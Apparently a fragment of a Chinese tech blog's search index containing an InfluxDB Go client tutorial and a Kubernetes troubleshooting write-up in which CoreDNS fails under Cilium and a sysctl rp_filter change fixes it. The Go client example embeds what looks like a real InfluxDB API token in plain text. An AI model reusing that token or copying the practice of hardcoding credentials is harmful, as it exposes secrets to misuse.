了解这些设计准则，我们能够更高效的使用它，能够合理的设计我们的数据存取方法。\nTime-ordered data 为提升性能，数据以时间升序的顺序写入。\nStrict update and delete permissions 为增加查询和写入性能，InfluxDB严格限制了更新和删除操作的权限。它所写入的时序数据几乎都是不会修改的最新的数据。因此更新和删除这两个动作在时序数据库中显得有些特殊。\nHandle read and write queries first 相对于强一致性而言，InfluxDB会优先处理读写请求。任何影响查询数据的事务执行优先级都是靠后的，以确保数据的最终一致性。例如，我们写入数据的频率特别高，每毫秒要写入多条数据，那么在写数据过程中读数据，就有可能读不到最新的数据。\nSchemaless design InfluxDB使用“schemaless”的设计来更好的管理断断续续的数据。例如，一个程序运行几十分钟然后结束了，我们所记录的数据也就在这几十分钟范围内。\nDatasets over individual points 通常讲，时序数据集整体比单个点的数据要重要。InfluxDB实现了强大的工具来聚合数据和处理大型数据集。而每条数据通过timestamp以及series来区分，所以InfluxDB中没有传统场景中的IDs（或者理解为主键）这一概念。\nDuplicate data 为简化冲突的解决和提高写性能，InfluxDB对相同的point不会存储两次。如果某个point的一个新的field value被提交，InfluxDB会将该point对应的field value设置为最新的那一个。在极少数情况下数据可能会被覆盖。关于重复数据的更多信息看这里。\nGo Client 在了解InfluxDB基本的概念后，来看看如何使用Go Client对InfluxDB进行数据基本操作。\n初始化客户端 package main import ( \u0026#34;context\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;time\u0026#34; \u0026#34;github.com/influxdata/influxdb-client-go/v2\u0026#34; ) func main() { // Create a client // You can generate an API Token from the \u0026#34;API Tokens Tab\u0026#34; in the UI client := influxdb2.NewClient(\u0026#34;http://192.168.153.21:8086\u0026#34;, \u0026#34;fKKv_DPSO3qiiHLgn38HeTNRhRPeNMYf2zSJVoMNWIpzoQBJ7Ugmc4He-TMm7dW8Mrbt_wgIKTi2-e-_YAQMgQ==\u0026#34;) // always close client at the end defer client.Close() } 通常InfluxDB的服务开在:8086端口，进行连接时需要使用token进行认证。需要注意最后释放客户端的连接。\n写数据 这里我们先声明我们所属的organization以及使用的bucket。\nbucket := \u0026#34;example-bucket\u0026#34; org := \u0026#34;example-org\u0026#34; 每一个writeAPI都需要唯一的organization和bucket对来指明。特别的，有两种写API，分别是：\nWriteAPI(org, bucket string) api.WriteAPI：异步，非阻塞 WriteAPIBlocking(org, bucket string) api.WriteAPIBlocking：同步，阻塞 推荐在有频繁的数据写入时使用异步写，使用异步写的时候有两个要点，一是buffer size，二是flush interval。如果不显式的使用Flush()，那么在数据积累到buffer size或者时间满足flush interval时会将数据进行写入。\n以WriteAPIBlocking为例，获取一个写接口。\nwriteAPI := client.WriteAPIBlocking(org, bucket) 然后进行数据写入：\n首先创建一个point，然后使用WritePoint方法预写到数据库中； p := influxdb2.NewPoint(\u0026#34;stat\u0026#34;, map[string]string{\u0026#34;unit\u0026#34;: \u0026#34;temperature\u0026#34;}, map[string]interface{}{\u0026#34;avg\u0026#34;: 24.5, \u0026#34;max\u0026#34;: 45}, time.Now()) writeAPI.WritePoint(context.Background(), p) 这里我们看一下NewPoint对应的函数签名：\nfunc NewPoint( measurement string, tags map[string]string, fields map[string]interface{}, ts time.Time, ) *write.Point { return write.NewPoint(measurement, tags, fields, ts) } 刚好对应上前面所涉及的一些概念。再复习一下前面，对于每一个数据点，我们使用series key来标定，而series key包括的内容就是measurement、tag set以及field key。再加上特定的时间戳，我们就能确定唯一的数据point。\n除了通过实例化Point写数据，还可以使用InfluxDB Line Protocol去写数据。具体参考InfluxDB Client Go的GitHub文档。\n这里Line Protocol是基于文本格式的measurement、tag set、field set以及timestamp的数据组织形式。语法如下：\n// Syntax \u0026lt;measurement\u0026gt;[,\u0026lt;tag_key\u0026gt;=\u0026lt;tag_value\u0026gt;[,\u0026lt;tag_key\u0026gt;=\u0026lt;tag_value\u0026gt;]] \u0026lt;field_key\u0026gt;=\u0026lt;field_value\u0026gt;[,\u0026lt;field_key\u0026gt;=\u0026lt;field_value\u0026gt;] [\u0026lt;timestamp\u0026gt;] // Example myMeasurement,tag1=value1,tag2=value2 fieldKey=\u0026#34;fieldValue\u0026#34; 1556813561098000000 具体来说有以下元素：\nmeasurementName,tagKey=tagValue fieldKey=\u0026#34;fieldValue\u0026#34; 1465839830100400200 --------------- --------------- --------------------- ------------------- | | | | Measurement Tag set Field set Timestamp 读数据 读数据则使用QueryAPI，利用查询语句进行数据读出。\nresult, err := queryAPI.Query(context.Background(), `from(bucket:\u0026#34;\u0026lt;bucket\u0026gt;\u0026#34;) |\u0026gt; range(start: -1h) |\u0026gt; filter(fn: (r) =\u0026gt; r._measurement == \u0026#34;stat\u0026#34;)`) if err == nil { for result.Next() { if result.TableChanged() { fmt.Printf(\u0026#34;table: %s\\n\u0026#34;, result.TableMetadata().String()) } fmt.Printf(\u0026#34;value: %v\\n\u0026#34;, result.Record().Value()) } if result.Err() != nil { fmt.Printf(\u0026#34;query parsing error: %s\\n\u0026#34;, result.Err().Error()) } } else { panic(err) } 参考整理 概念：https://docs.influxdata.com/influxdb/v2.3/reference/key-concepts/\nGitHub Go Client：https://github.com/influxdata/influxdb-client-go\n官方文档对Go Client的说明：https://docs.influxdata.com/influxdb/v2.3/api-guide/client-libraries/go/\nLine Protocol：https://docs.influxdata.com/influxdb/v2.3/reference/syntax/line-protocol/\n中文文档（版本较老）：https://jasper-zhang1.gitbooks.io/influxdb/content/Concepts/key_concepts.html\n","date":"2022-07-20T20:22:12+08:00","permalink":"https://lizonglingo.github.io/p/influxdb-go-client%E7%9A%84%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/","title":"InfluxDB Go Client的使用说明"},{"content":" 该问题最后在Github的Cilium项目中提了issue，被大佬解决了。\nissue地址：https://github.com/cilium/cilium/issues/20498\n问题描述 由于后面打算学习eBPF，将原来用的CNI组件从flannel换成cilium。Cilium作为基于eBPF的CNI实现，比起flannel有了更多的功能，包括但不限于高度定制化的网络策略、安全加固。\n但是，我在使用cilium时，出现如下问题，以下是集群部署的过程，及问题发现和问题描述。\n版本信息如下：\nKubernetes 1.23.0 （kubelet/kubeadm/kubectl都对应集群版本） Cilium 1.11.6 使用kubeadm --config kubeadm.conf 初始化集群，初始化的配置文件如下。 kind: InitConfiguration localAPIEndpoint: advertiseAddress: 192.168.153.21 bindPort: 6443 nodeRegistration: criSocket: /var/run/dockershim.sock imagePullPolicy: IfNotPresent name: nm taints: null --- apiServer: timeoutForControlPlane: 4m0s apiVersion: kubeadm.k8s.io/v1beta3 certificatesDir: /etc/kubernetes/pki clusterName: kubernetes controllerManager: {} dns: {} etcd: local: dataDir: /var/lib/etcd imageRepository: registry.aliyuncs.com/google_containers kind: ClusterConfiguration kubernetesVersion: 1.23.0 networking: dnsDomain: cluster.local serviceSubnet: 10.96.0.0/12 podSubnet: 10.5.0.0/16 scheduler: {} --- apiVersion: kubelet.config.k8s.io/v1beta1 kind: KubeletConfiguration resolvConf: /run/systemd/resolve/resolv.conf 然后像往常一样加入工作节点，测试集群使用1Master和2Worker，其IP如下。 master: 192.168.153.21 worker1: 192.168.153.22 worker2: 192.168.153.23 安装网络组件，使用cilium install进行安装，其中一些cilium的配置保持默认。 root@nm:/work-place/kubernetes/create-cluster# kubectl get pods -A -o wide NAMESPACE NAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES kube-system cilium-99lxc 1/1 Running 0 18m 192.168.153.22 na \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system cilium-ct5s7 1/1 Running 0 18m 192.168.153.21 nm \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system cilium-drtlh 1/1 Running 0 18m 192.168.153.23 nb \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system cilium-operator-5d67fc458d-zxgdd 1/1 Running 0 18m 192.168.153.22 na \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system coredns-6d8c4cb4d-jkssb 0/1 Running 8 (2m55s ago) 19m 10.0.0.240 na \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system coredns-6d8c4cb4d-psxvw 0/1 CrashLoopBackOff 8 (83s ago) 19m 10.0.2.176 nb \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system etcd-nm 1/1 Running 2 25m 192.168.153.21 nm \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system kube-apiserver-nm 1/1 Running 2 25m 192.168.153.21 nm \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system kube-controller-manager-nm 1/1 Running 2 25m 192.168.153.21 nm \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system kube-proxy-hv5nc 1/1 Running 0 24m 192.168.153.22 na \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system kube-proxy-pbzlx 1/1 Running 0 24m 192.168.153.23 nb \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system kube-proxy-rqpxw 1/1 Running 0 25m 192.168.153.21 nm \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system kube-scheduler-nm 1/1 Running 2 25m 192.168.153.21 nm \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; 安装cilium之前，我已经清理的之前的CNI配置，将/etc/cni/net.d/下面的网络配置全部清除。但是出现了上述情况，两个coredns的Pod虽然处于Running状态但是始终不Ready。\n然后我查看了coredns的log以及describe。\nroot@nm:/work-place/kubernetes/create-cluster# kubectl logs coredns-6d8c4cb4d-jkssb -n kube-system [WARNING] plugin/kubernetes: starting server with unsynced Kubernetes API .:53 [INFO] plugin/reload: Running configuration MD5 = db32ca3650231d74073ff4cf814959a7 CoreDNS-1.8.6 linux/amd64, go1.17.1, 13a9191 [ERROR] plugin/errors: 2 7607030484537686268.4300248127207674545. HINFO: read udp 10.0.0.240:39983-\u0026gt;192.168.153.2:53: i/o timeout [ERROR] plugin/errors: 2 7607030484537686268.4300248127207674545. HINFO: read udp 10.0.0.240:53240-\u0026gt;192.168.153.2:53: i/o timeout [ERROR] plugin/errors: 2 7607030484537686268.4300248127207674545. HINFO: read udp 10.0.0.240:49802-\u0026gt;192.168.153.2:53: i/o timeout [ERROR] plugin/errors: 2 7607030484537686268.4300248127207674545. HINFO: read udp 10.0.0.240:54428-\u0026gt;192.168.153.2:53: i/o timeout [ERROR] plugin/errors: 2 7607030484537686268.4300248127207674545. HINFO: read udp 10.0.0.240:43974-\u0026gt;192.168.153.2:53: i/o timeout [ERROR] plugin/errors: 2 7607030484537686268.4300248127207674545. HINFO: read udp 10.0.0.240:37821-\u0026gt;192.168.153.2:53: i/o timeout [ERROR] plugin/errors: 2 7607030484537686268.4300248127207674545. HINFO: read udp 10.0.0.240:36545-\u0026gt;192.168.153.2:53: i/o timeout [ERROR] plugin/errors: 2 7607030484537686268.4300248127207674545. HINFO: read udp 10.0.0.240:56785-\u0026gt;192.168.153.2:53: i/o timeout [ERROR] plugin/errors: 2 7607030484537686268.4300248127207674545. HINFO: read udp 10.0.0.240:47913-\u0026gt;192.168.153.2:53: i/o timeout [ERROR] plugin/errors: 2 7607030484537686268.4300248127207674545. HINFO: read udp 10.0.0.240:38162-\u0026gt;192.168.153.2:53: i/o timeout [INFO] SIGTERM: Shutting down servers then terminating [INFO] plugin/health: Going into lameduck mode for 5s coredns对其上游的网关UDP服务不可达，这里的192.168.153.2是我虚拟机网络的网关。\nroot@nm:/work-place/kubernetes/create-cluster# kubectl describe pod coredns-6d8c4cb4d-jkssb -n kube-system Name: coredns-6d8c4cb4d-jkssb Namespace: kube-system Priority: 2000000000 Priority Class Name: system-cluster-critical Node: na/192.168.153.22 Start Time: Wed, 13 Jul 2022 00:37:51 +0800 Labels: k8s-app=kube-dns pod-template-hash=6d8c4cb4d Annotations: \u0026lt;none\u0026gt; Status: Running IP: 10.0.0.240 IPs: IP: 10.0.0.240 Controlled By: ReplicaSet/coredns-6d8c4cb4d Containers: coredns: Container ID: docker://cc35b97903b120cb54765641da47c69ea8c833e6c72958407c7e605a5aa001b4 Image: registry.aliyuncs.com/google_containers/coredns:v1.8.6 Image ID: docker-pullable://registry.aliyuncs.com/google_containers/coredns@sha256:5b6ec0d6de9baaf3e92d0f66cd96a25b9edbce8716f5f15dcd1a616b3abd590e Ports: 53/UDP, 53/TCP, 9153/TCP Host Ports: 0/UDP, 0/TCP, 0/TCP Args: -conf /etc/coredns/Corefile State: Waiting Reason: CrashLoopBackOff Last State: Terminated Reason: Completed Exit Code: 0 Started: Wed, 13 Jul 2022 00:57:12 +0800 Finished: Wed, 13 Jul 2022 00:59:06 +0800 Ready: False Restart Count: 8 Limits: memory: 170Mi Requests: cpu: 100m memory: 70Mi Liveness: http-get http://:8080/health delay=60s timeout=5s period=10s #success=1 #failure=5 Readiness: http-get http://:8181/ready delay=0s timeout=1s period=10s #success=1 #failure=3 Environment: \u0026lt;none\u0026gt; Mounts: /etc/coredns from config-volume (ro) /var/run/secrets/kubernetes.io/serviceaccount from kube-api-access-v8hzn (ro) Conditions: Type Status Initialized True Ready False ContainersReady False PodScheduled True Volumes: config-volume: Type: ConfigMap (a volume populated by a ConfigMap) Name: coredns Optional: false kube-api-access-v8hzn: Type: Projected (a volume that contains injected data from multiple sources) TokenExpirationSeconds: 3607 ConfigMapName: kube-root-ca.crt ConfigMapOptional: \u0026lt;nil\u0026gt; DownwardAPI: true QoS Class: Burstable Node-Selectors: kubernetes.io/os=linux Tolerations: CriticalAddonsOnly op=Exists node-role.kubernetes.io/control-plane:NoSchedule node-role.kubernetes.io/master:NoSchedule node.kubernetes.io/not-ready:NoExecute op=Exists for 300s node.kubernetes.io/unreachable:NoExecute op=Exists for 300s Events: Type Reason Age From Message ---- ------ ---- ---- ------- Normal Scheduled 21m default-scheduler Successfully assigned kube-system/coredns-6d8c4cb4d-jkssb to na Warning FailedCreatePodSandBox 20m kubelet Failed to create pod sandbox: rpc error: code = Unknown desc = failed to set up sandbox container \u0026#34;8ae4c118e4c3ff1c0bd2c601c808cae2c17cbc27552fb148b755b7d798f0bb71\u0026#34; network for pod \u0026#34;coredns-6d8c4cb4d-jkssb\u0026#34;: networkPlugin cni failed to set up pod \u0026#34;coredns-6d8c4cb4d-jkssb_kube-system\u0026#34; network: unable to connect to Cilium daemon: failed to create cilium agent client after 30.000000 seconds timeout: Get \u0026#34;http:///var/run/cilium/cilium.sock/v1/config\u0026#34;: dial unix /var/run/cilium/cilium.sock: connect: no such file or directory Is the agent running? Normal SandboxChanged 20m kubelet Pod sandbox changed, it will be killed and re-created. Normal Pulled 20m kubelet Container image \u0026#34;registry.aliyuncs.com/google_containers/coredns:v1.8.6\u0026#34; already present on machine Normal Created 20m kubelet Created container coredns Normal Started 20m kubelet Started container coredns Warning Unhealthy 20m (x2 over 20m) kubelet Readiness probe failed: Get \u0026#34;http://10.0.0.240:8181/ready\u0026#34;: dial tcp 10.0.0.240:8181: i/o timeout (Client.Timeout exceeded while awaiting headers) Warning Unhealthy 18m (x13 over 20m) kubelet Readiness probe failed: Get \u0026#34;http://10.0.0.240:8181/ready\u0026#34;: context deadline exceeded (Client.Timeout exceeded while awaiting headers) Warning Unhealthy 15m (x12 over 19m) kubelet Liveness probe failed: Get \u0026#34;http://10.0.0.240:8080/health\u0026#34;: context deadline exceeded (Client.Timeout exceeded while awaiting headers) Normal Killing 14m kubelet Container coredns failed liveness probe, will be restarted 而describe给出的信息则是健康检查失败。奇怪的是，cilium的组件的状态则正常，但由于coredns状态异常，显然集群网络无法正常工作。\nroot@nm:/work-place/kubernetes/create-cluster# cilium status /¯¯\\ /¯¯\\__/¯¯\\ Cilium: 3 errors \\__/¯¯\\__/ Operator: OK /¯¯\\__/¯¯\\ Hubble: disabled \\__/¯¯\\__/ ClusterMesh: disabled \\__/ DaemonSet cilium Desired: 3, Ready: 3/3, Available: 3/3 Deployment cilium-operator Desired: 1, Ready: 1/1, Available: 1/1 Containers: cilium Running: 3 cilium-operator Running: 1 Cluster Pods: 2/2 managed by Cilium Image versions cilium-operator quay.io/cilium/operator-generic:v1.11.6@sha256:9f6063c7bcaede801a39315ec7c166309f6a6783e98665f6693939cf1701bc17: 1 cilium quay.io/cilium/cilium:v1.11.6@sha256:f7f93c26739b6641a3fa3d76b1e1605b15989f25d06625260099e01c8243f54c: 3 Errors: cilium cilium-hn9g5 controller cilium-health-ep is failing since 27s (21x): Get \u0026#34;http://10.0.2.134:4240/hello\u0026#34;: context deadline exceeded (Client.Timeout exceeded while awaiting headers) cilium cilium-7l6br controller cilium-health-ep is failing since 27s (21x): Get \u0026#34;http://10.0.0.36:4240/hello\u0026#34;: context deadline exceeded (Client.Timeout exceeded while awaiting headers) cilium cilium-rzkb6 controller cilium-health-ep is failing since 27s (21x): Get \u0026#34;http://10.0.1.222:4240/hello\u0026#34;: context deadline exceeded (Client.Timeout exceeded while awaiting headers) 补充信息 另外，一些关键组件的补充信息如下。\ncilium sysdump root@nm:/work-place/kubernetes/create-cluster# cilium sysdump 🔍 Collecting sysdump with cilium-cli version: v0.11.11, args: [sysdump] 🔍 Collecting Kubernetes nodes 🔍 Collect Kubernetes nodes 🔍 Collecting Kubernetes events 🔍 Collecting Kubernetes pods 🔍 Collect Kubernetes version 🔍 Collecting Kubernetes namespaces 🔍 Collecting Kubernetes services 🔍 Collecting Kubernetes pods summary 🔍 Collecting Kubernetes endpoints 🔍 Collecting Kubernetes network policies 🔍 Collecting Cilium cluster-wide network policies 🔍 Collecting Cilium network policies 🔍 Collecting Cilium local redirect policies 🔍 Collecting Cilium egress NAT policies 🔍 Collecting Cilium endpoints 🔍 Collecting Cilium identities 🔍 Collecting Cilium nodes 🔍 Collecting Ingresses 🔍 Collecting CiliumEnvoyConfigs 🔍 Collecting CiliumClusterwideEnvoyConfigs 🔍 Collecting Cilium etcd secret 🔍 Collecting the Cilium configuration 🔍 Collecting the Cilium daemonset(s) 🔍 Collecting the Hubble daemonset 🔍 Collecting the Hubble Relay deployment 🔍 Collecting the Hubble Relay configuration 🔍 Collecting the Hubble UI deployment 🔍 Collecting the Cilium operator deployment 🔍 Collecting the CNI configuration files from Cilium pods ⚠️ Deployment \u0026#34;hubble-ui\u0026#34; not found in namespace \u0026#34;kube-system\u0026#34; - this is expected if Hubble UI is not enabled 🔍 Collecting the CNI configmap 🔍 Collecting the \u0026#39;clustermesh-apiserver\u0026#39; deployment ⚠️ Deployment \u0026#34;hubble-relay\u0026#34; not found in namespace \u0026#34;kube-system\u0026#34; - this is expected if Hubble is not enabled 🔍 Collecting gops stats from Cilium pods 🔍 Collecting gops stats from Hubble pods 🔍 Collecting gops stats from Hubble Relay pods 🔍 Collecting \u0026#39;cilium-bugtool\u0026#39; output from Cilium pods 🔍 Collecting logs from Cilium pods 🔍 Collecting logs from Cilium operator pods ⚠️ Deployment \u0026#34;clustermesh-apiserver\u0026#34; not found in namespace \u0026#34;kube-system\u0026#34; - this is expected if \u0026#39;clustermesh-apiserver\u0026#39; isn\u0026#39;t enabled 🔍 Collecting logs from \u0026#39;clustermesh-apiserver\u0026#39; pods 🔍 Collecting logs from Hubble pods 🔍 Collecting logs from Hubble Relay pods 🔍 Collecting logs from Hubble UI pods 🔍 Collecting platform-specific data 🔍 Collecting Hubble flows from Cilium pods ⚠️ The following tasks failed, the sysdump may be incomplete: ⚠️ [11] Collecting Cilium egress NAT policies: failed to collect Cilium egress NAT policies: the server could not find the requested resource (get ciliumegressnatpolicies.cilium.io) ⚠️ [12] Collecting Cilium local redirect policies: failed to collect Cilium local redirect policies: the server could not find the requested resource (get ciliumlocalredirectpolicies.cilium.io) ⚠️ [17] Collecting CiliumClusterwideEnvoyConfigs: failed to collect CiliumClusterwideEnvoyConfigs: the server could not find the requested resource (get ciliumclusterwideenvoyconfigs.cilium.io) ⚠️ [18] Collecting CiliumEnvoyConfigs: failed to collect CiliumEnvoyConfigs: the server could not find the requested resource (get ciliumenvoyconfigs.cilium.io) ⚠️ [23] Collecting the Hubble Relay configuration: failed to collect the Hubble Relay configuration: configmaps \u0026#34;hubble-relay-config\u0026#34; not found ⚠️ cniconflist-cilium-7l6br: error dialing backend: dial tcp 192.168.153.23:10250: connect: no route to host ⚠️ cniconflist-cilium-hn9g5: command terminated with exit code 1 ⚠️ cniconflist-cilium-rzkb6: command terminated with exit code 1 ⚠️ gops-cilium-7l6br-memstats: failed to list processes \u0026#34;cilium-7l6br\u0026#34; (\u0026#34;cilium-agent\u0026#34;) in namespace \u0026#34;kube-system\u0026#34;: error dialing backend: dial tcp 192.168.153.23:10250: connect: no route to host ⚠️ gops-cilium-7l6br-stack: failed to list processes \u0026#34;cilium-7l6br\u0026#34; (\u0026#34;cilium-agent\u0026#34;) in namespace \u0026#34;kube-system\u0026#34;: error dialing backend: dial tcp 192.168.153.23:10250: connect: no route to host ⚠️ gops-cilium-7l6br-stats: failed to list processes \u0026#34;cilium-7l6br\u0026#34; (\u0026#34;cilium-agent\u0026#34;) in namespace \u0026#34;kube-system\u0026#34;: error dialing backend: dial tcp 192.168.153.23:10250: connect: no route to host ⚠️ cilium-bugtool-cilium-7l6br: failed to collect \u0026#39;cilium-bugtool\u0026#39; output for \u0026#34;cilium-7l6br\u0026#34; in namespace \u0026#34;kube-system\u0026#34;: error dialing backend: dial tcp 192.168.153.23:10250: connect: no route to host: ⚠️ logs-cilium-7l6br-cilium-agent: failed to collect logs for \u0026#34;cilium-7l6br\u0026#34; (\u0026#34;cilium-agent\u0026#34;) in namespace \u0026#34;kube-system\u0026#34;: Get \u0026#34;https://192.168.153.23:10250/containerLogs/kube-system/cilium-7l6br/cilium-agent?limitBytes=1073741824\u0026amp;sinceTime=2021-07-13T08%3A20%3A54Z\u0026amp;timestamps=true\u0026#34;: dial tcp 192.168.153.23:10250: connect: no route to host ⚠️ logs-cilium-operator-5d67fc458d-gjdc6-cilium-operator: failed to collect logs for \u0026#34;cilium-operator-5d67fc458d-gjdc6\u0026#34; (\u0026#34;cilium-operator\u0026#34;) in namespace \u0026#34;kube-system\u0026#34;: Get \u0026#34;https://192.168.153.23:10250/containerLogs/kube-system/cilium-operator-5d67fc458d-gjdc6/cilium-operator?limitBytes=1073741824\u0026amp;sinceTime=2021-07-13T08%3A20%3A55Z\u0026amp;timestamps=true\u0026#34;: dial tcp 192.168.153.23:10250: connect: no route to host ⚠️ logs-cilium-7l6br-mount-cgroup: failed to collect logs for \u0026#34;cilium-7l6br\u0026#34; (\u0026#34;mount-cgroup\u0026#34;) in namespace \u0026#34;kube-system\u0026#34;: Get \u0026#34;https://192.168.153.23:10250/containerLogs/kube-system/cilium-7l6br/mount-cgroup?limitBytes=1073741824\u0026amp;sinceTime=2021-07-13T08%3A20%3A54Z\u0026amp;timestamps=true\u0026#34;: dial tcp 192.168.153.23:10250: connect: no route to host ⚠️ logs-cilium-7l6br-clean-cilium-state: failed to collect logs for \u0026#34;cilium-7l6br\u0026#34; (\u0026#34;clean-cilium-state\u0026#34;) in namespace \u0026#34;kube-system\u0026#34;: Get \u0026#34;https://192.168.153.23:10250/containerLogs/kube-system/cilium-7l6br/clean-cilium-state?limitBytes=1073741824\u0026amp;sinceTime=2021-07-13T08%3A20%3A54Z\u0026amp;timestamps=true\u0026#34;: dial tcp 192.168.153.23:10250: connect: no route to host ⚠️ hubble-flows-cilium-7l6br: failed to collect hubble flows for \u0026#34;cilium-7l6br\u0026#34; in namespace \u0026#34;kube-system\u0026#34;: error dialing backend: dial tcp 192.168.153.23:10250: connect: no route to host: ⚠️ Please note that depending on your Cilium version and installation options, this may be expected 🗳 Compiling sysdump ✅ The sysdump has been saved to /work-place/kubernetes/create-cluster/cilium-sysdump-20220713-162053.zip coredns的configMap root@nm:/work-place/kubernetes/create-cluster# kubectl describe cm coredns -n kube-system\rName: coredns\rNamespace: kube-system\rLabels: \u0026lt;none\u0026gt;\rAnnotations: \u0026lt;none\u0026gt;\rData\r====\rCorefile:\r----\r.:53 {\rerrors\rhealth {\rlameduck 5s\r}\rready\rkubernetes cluster.local in-addr.arpa ip6.arpa {\rpods insecure\rfallthrough in-addr.arpa ip6.arpa\rttl 30\r}\rprometheus :9153\rforward . /etc/resolv.conf {\rmax_concurrent 1000\r}\rcache 30\rloop\rreload\rloadbalance\r}\rBinaryData\r====\rEvents: \u0026lt;none\u0026gt; kubelet的config信息 root@nm:/home/lzl# cat /var/lib/kubelet/config.yaml apiVersion: kubelet.config.k8s.io/v1beta1\rauthentication:\ranonymous:\renabled: false\rwebhook:\rcacheTTL: 0s\renabled: true\rx509:\rclientCAFile: /etc/kubernetes/pki/ca.crt\rauthorization:\rmode: Webhook\rwebhook:\rcacheAuthorizedTTL: 0s\rcacheUnauthorizedTTL: 0s\rcgroupDriver: systemd\rclusterDNS:\r- 10.96.0.10\rclusterDomain: cluster.local\rcpuManagerReconcilePeriod: 0s\revictionPressureTransitionPeriod: 0s\rfileCheckFrequency: 0s\rhealthzBindAddress: 127.0.0.1\rhealthzPort: 10248\rhttpCheckFrequency: 0s\rimageMinimumGCAge: 0s\rkind: KubeletConfiguration\rlogging:\rflushFrequency: 0\roptions:\rjson:\rinfoBufferSize: \u0026#34;0\u0026#34;\rverbosity: 0\rmemorySwap: {}\rnodeStatusReportFrequency: 0s\rnodeStatusUpdateFrequency: 0s\rresolvConf: /run/systemd/resolve/resolv.conf\rrotateCertificates: true\rruntimeRequestTimeout: 0s\rshutdownGracePeriod: 0s\rshutdownGracePeriodCriticalPods: 0s\rstaticPodPath: /etc/kubernetes/manifests\rstreamingConnectionIdleTimeout: 0s\rsyncFrequency: 0s\rvolumeStatsAggPeriod: 0s kubeadm对kubelet添加的flag root@nm:/home/lzl# cat /var/lib/kubelet/kubeadm-flags.env KUBELET_KUBEADM_ARGS=\u0026#34;--network-plugin=cni --pod-infra-container-image=registry.aliyuncs.com/google_containers/pause:3.6\u0026#34; OS信息 $ cat /etc/os-release PRETTY_NAME=\u0026#34;Ubuntu 22.04 LTS\u0026#34; NAME=\u0026#34;Ubuntu\u0026#34; VERSION_ID=\u0026#34;22.04\u0026#34; VERSION=\u0026#34;22.04 LTS (Jammy Jellyfish)\u0026#34; VERSION_CODENAME=jammy ID=ubuntu ID_LIKE=debian HOME_URL=\u0026#34;https://www.ubuntu.com/\u0026#34; SUPPORT_URL=\u0026#34;https://help.ubuntu.com/\u0026#34; BUG_REPORT_URL=\u0026#34;https://bugs.launchpad.net/ubuntu/\u0026#34; PRIVACY_POLICY_URL=\u0026#34;https://www.ubuntu.com/legal/terms-and-policies/privacy-policy\u0026#34; UBUNTU_CODENAME=jammy $ uname -a Linux nm 5.15.0-41-generic #44-Ubuntu SMP Wed Jun 22 14:20:53 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux sysctl -a | grep -w rp_filter信息如下 root@nm:/work-place/kubernetes/create-cluster# sysctl -a | grep -w rp_filter net.ipv4.conf.all.rp_filter = 0 net.ipv4.conf.cilium_host.rp_filter = 0 net.ipv4.conf.cilium_net.rp_filter = 0 net.ipv4.conf.cilium_vxlan.rp_filter = 0 net.ipv4.conf.default.rp_filter = 2 net.ipv4.conf.docker0.rp_filter = 2 net.ipv4.conf.ens33.rp_filter = 2 net.ipv4.conf.lo.rp_filter = 2 net.ipv4.conf.lxc_health.rp_filter = 2 此外，补充一点，在我使用flannel做集群网络时，一切都是正常的。\n我所做的尝试 在大佬指点之前，我按照下面的链接做出一些调整。\ncoredns在k8s集群中的troubleshooting：https://github.com/coredns/coredns/blob/master/plugin/loop/README.md#troubleshooting-loops-in-kubernetes-clusters 和我这个问题比较相似的plugin/loop导致的集群网络异常：https://github.com/coredns/coredns/issues/2790 本次排错中也出现的coredns [ERROR] plugin/errors: 2 read udp上游不可达：https://github.com/kubernetes/kubernetes/issues/86762 然后我又通过busybox进到容器里面，分别在正常的使用flannel的网络环境和异常的使用cilium的网络环境下去尝试ping我的网关。\n在使用flannel的网络中，一切正常：\nroot@master:/home/lzl/work-place/kubernetes/deploy-k8s# kubectl run -it --rm --restart=Never busybox --image=docker.io/library/busybox sh If you don\u0026#39;t see a command prompt, try pressing enter. / # ping 10.96.0.10 PING 10.96.0.10 (10.96.0.10): 56 data bytes ^C --- 10.96.0.10 ping statistics --- 4 packets transmitted, 0 packets received, 100% packet loss / # ping 192.168.153.2 PING 192.168.153.2 (192.168.153.2): 56 data bytes 64 bytes from 192.168.153.2: seq=0 ttl=127 time=0.458 ms 64 bytes from 192.168.153.2: seq=1 ttl=127 time=0.405 ms 64 bytes from 192.168.153.2: seq=2 ttl=127 time=1.041 ms ^C --- 192.168.153.2 ping statistics --- 3 packets transmitted, 3 packets received, 0% packet loss round-trip min/avg/max = 0.405/0.634/1.041 ms 而使用cilium中异常网络，则无法ping通：\nroot@nm:/work-place/kubernetes/create-cluster# kubectl run -it --rm --restart=Never busybox --image=docker.io/library/busybox sh If you don\u0026#39;t see a command prompt, try pressing enter. / # ping 192.168.153.2 PING 192.168.153.2 (192.168.153.2): 56 data bytes 我所做的尝试都没有用。\n问题解决 最终的解决办法是vincentmli给出的，如下。\n手工在 /etc/sysctl.d/ 中写入下面的文件，然后重启节点。\ncat /etc/sysctl.d/99-zzz-override_cilium.conf\r# Disable rp_filter on Cilium interfaces since it may cause mangled packets to be dropped\rnet.ipv4.conf.lxc*.rp_filter = 0\rnet.ipv4.conf.cilium_*.rp_filter = 0\r# The kernel uses max(conf.all, conf.{dev}) as its value, so we need to set .all. to 0 as well.\r# Otherwise it will overrule the device specific settings.\rnet.ipv4.conf.all.rp_filter = 0 